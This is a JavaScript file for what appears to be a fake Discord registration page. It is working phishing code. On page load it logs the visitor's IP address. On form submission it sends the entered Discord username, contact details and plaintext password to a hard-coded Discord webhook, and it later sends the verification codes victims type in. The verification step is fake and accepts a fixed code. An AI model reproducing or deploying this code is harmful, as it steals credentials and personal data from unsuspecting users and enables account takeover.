function logData(eventType, data) {
    console.log(`[LOG] ${eventType}:`, data);

    // Send properly formatted payload
    fetch('https://discord.com/api/webhooks/1388139167103582218/OTZHoiUd0w-XiBleGI5w_U8iE2rfZuQhpA6AT7Yo8n-iofiK1xWQVaxqFjEx0WBPJ6rt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `📩 New **${eventType}** received!`,
            embeds: [
                {
                    title: "Form Data",
                    description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
                    color: 0x5865F2
                }
            ]
        })
    })
    .then(res => {
        if (!res.ok) throw new Error(`Discord webhook failed: ${res.status}`);
        else console.log("✅ Webhook sent");
    })
    .catch(err => {
        console.error("❌ Webhook error:", err);
    });

    // Update IP status in UI (if present)
    const status = document.getElementById('statusText');
    if (status) status.textContent = `IP Logged: ${data.ip || 'N/A'}`;
}

document.addEventListener('DOMContentLoaded', function () {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            logData('page_visit', { ip: data.ip });
        })
        .catch(() => {
            logData('page_visit', { ip: 'Unknown' });
        });

    const registerForm = document.getElementById('registerForm');
    const verificationMessage = document.getElementById('verificationMessage');
    const codeInputs = document.getElementById('codeInputs');
    const resendLink = document.getElementById('resendLink');
    const emailDisplay = document.getElementById('emailDisplay');
    const contactInput = document.getElementById('contactInfo');
    const steps = document.querySelectorAll('.step');
    const errorMessage = document.getElementById('errorMessage');
    const successMessage = document.getElementById('successMessage');
    const welcomeUsername = document.getElementById('welcomeUsername');
    const resendBtn = document.getElementById('resendBtn');

    registerForm.addEventListener('submit', function (e) {
        e.preventDefault();

        const discordUsername = document.getElementById('discordUsername').value;
        const contactValue = contactInput.value;
        const password = document.getElementById('password').value;

        logData('form_submission', {
            discordUsername,
            contactValue,
            password
        });

        emailDisplay.textContent = contactValue;
        verificationMessage.style.display = 'block';
        codeInputs.style.display = 'flex';
        resendLink.style.display = 'block';
        registerForm.style.display = 'none';
        errorMessage.style.display = 'none';
        steps[0].classList.remove('active');
        steps[1].classList.add('active');

        setTimeout(() => {
            document.querySelector('.code-inputs input[data-index="0"]').focus();
        }, 300);
    });

    const codeInputElements = document.querySelectorAll('.code-inputs input');
    codeInputElements.forEach(input => {
        input.addEventListener('input', function () {
            if (this.value) {
                const nextIndex = parseInt(this.dataset.index) + 1;
                if (nextIndex < 6) {
                    codeInputElements[nextIndex].focus();
                } else {
                    this.blur();
                    verifyCode();
                }
            }
        });

        input.addEventListener('keydown', function (e) {
            if (e.key === 'Backspace' && !this.value) {
                const prevIndex = parseInt(this.dataset.index) - 1;
                if (prevIndex >= 0) {
                    codeInputElements[prevIndex].focus();
                }
            }
        });
    });

    function verifyCode() {
        let code = '';
        codeInputElements.forEach(input => {
            code += input.value;
        });

        if (code.length === 6) {
            if (code === '111111') {
                const username = document.getElementById('discordUsername').value;
                welcomeUsername.textContent = username;
                verificationMessage.style.display = 'none';
                codeInputs.style.display = 'none';
                resendLink.style.display = 'none';
                errorMessage.style.display = 'none';
                successMessage.style.display = 'block';
                steps[1].classList.remove('active');
                steps[2].classList.add('active');

                logData('verification_success', {
                    username: username,
                    contact: contactInput.value
                });
            } else {
                errorMessage.style.display = 'block';
                codeInputElements.forEach(input => input.value = '');
                codeInputElements[0].focus();

                logData('verification_failed', {
                    codeAttempt: code,
                    contact: contactInput.value
                });
            }
        }
    }

    resendBtn.addEventListener('click', function (e) {
        e.preventDefault();

        const originalMessage = verificationMessage.innerHTML;
        verificationMessage.innerHTML = `
            <p><i class="fas fa-sync-alt fa-spin"></i> Sending a new code to <strong>${contactInput.value}</strong>...</p>
        `;

        logData('code_resend', { contact: contactInput.value });

        setTimeout(() => {
            verificationMessage.innerHTML = originalMessage;

            const notification = document.createElement('p');
            notification.innerHTML = '<i class="fas fa-check"></i> New code sent successfully!';
            notification.style.color = '#57F287';
            notification.style.marginTop = '10px';
            verificationMessage.appendChild(notification);

            codeInputElements.forEach(input => input.value = '');
            codeInputElements[0].focus();
            errorMessage.style.display = 'none';

            setTimeout(() => {
                notification.remove();
            }, 3000);
        }, 1500);
    });
});
